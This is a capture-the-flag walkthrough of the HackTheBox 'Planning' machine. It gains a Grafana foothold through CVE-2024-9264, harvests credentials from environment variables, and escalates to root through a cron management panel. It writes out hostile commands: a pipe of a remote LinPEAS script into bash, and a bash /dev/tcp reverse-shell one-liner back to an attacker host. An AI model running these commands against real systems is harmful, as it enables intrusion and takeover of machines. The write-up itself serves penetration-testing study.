# HackTheBox — [Planning](https://app.hackthebox.com/machines/Planning)

## Task Description:
As is common in real-life pentests, you will start the Planning box with credentials for the following account:
```admin / 0D5oT70Fq13EvB5r```

## Scanning
We begin with a basic nmap scan:
```python
nmap -A 10.10.11.68
```
Open ports:

22 — SSH

80 — HTTP (web interface)

We add the domain to our ```/etc/hosts:```

```python
sudo nano /etc/hosts

10.10.11.68 planning.htb
```
## Exploring the Web Interface

Visiting ```http://planning.htb``` shows a standard landing page.

Directory brute-forcing (using ```dirb```, ```gobuster```, ```ffuf```) yields no useful results.

## Subdomain Enumeration
We move on to subdomain fuzzing:

```python
ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" \
-w /usr/share/seclists/Discovery/DNS/namelist.txt -c -t 50 -fs 178
```
We discover an interesting subdomain:
```python
grafana [Status: 302]
```
Add it to ```/etc/hosts```:
```python
sudo nano /etc/hosts

10.10.11.68 planning.htb grafana.planning.htb
```
## Logging into Grafana

Visiting ```http://grafana.planning.htb``` leads us to a Grafana login form.

We use the credentials provided in the task description:

```python
admin / 0D5oT70Fq13EvB5r
```
Login is successful.

## Exploiting Grafana RCE CVE-2024-9264

We find a recent Grafana RCE vulnerability:

> https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

We set up a listener:
```python
nc -lvnp 5555
```
Run the exploit:
```python
python3 poc.py --url http://grafana.planning.htb:80 \
--username admin --password 0D5oT70Fq13EvB5r \
--reverse-ip 10.10.10.10 --reverse-port 5555
```
Reverse shell acquired!

## Inside a Docker Container

Running ```env```, we see interesting environment variables:

```python
GF_SECURITY_ADMIN_USER=enzo

GF_SECURITY_ADMIN_PASSWORD=RioTec*********
```
## SSH Access with Found Credentials
We try SSH access using the credentials:

```python
ssh enzo@10.10.11.68
```
Success! We retrieve user.txt.

## Privilege Escalation

We upload LinPEAS for enumeration:

```python
curl http://10.10.10.10/linpeas.sh | bash
```
We find a file:

```python
/opt/crontabs/crontab.db
```
Inside are credentials:

```python
root:P4ssw0rd***
```
However, these credentials do not work for root over SSH or ```su```.

## Exploring Local Services
LinPEAS also reveals a local service running on:

```python
127.0.0.1:8000
```
We forward the port via SSH:

```python
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```
Accessing ```http://localhost:8000``` reveals a CronJob Management Panel.

## Code Execution via CronJobs
We click "New", and in the Command field, we insert:

```python
bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/8888 <&1'
```
Set up a second listener:
```python
nc -lvnp 8888
```
Click "Run Now" in the panel.

We gain a reverse root shell and capture root.txt.

## Conclusion

The Planning machine simulates a real-world pentest scenario that begins with valid credentials. Successful exploitation required:

* Subdomain enumeration

* Remote Code Execution in Grafana (CVE-2024-9264)

* Discovering credentials inside a Docker container

* Privilege escalation via a hidden local web service


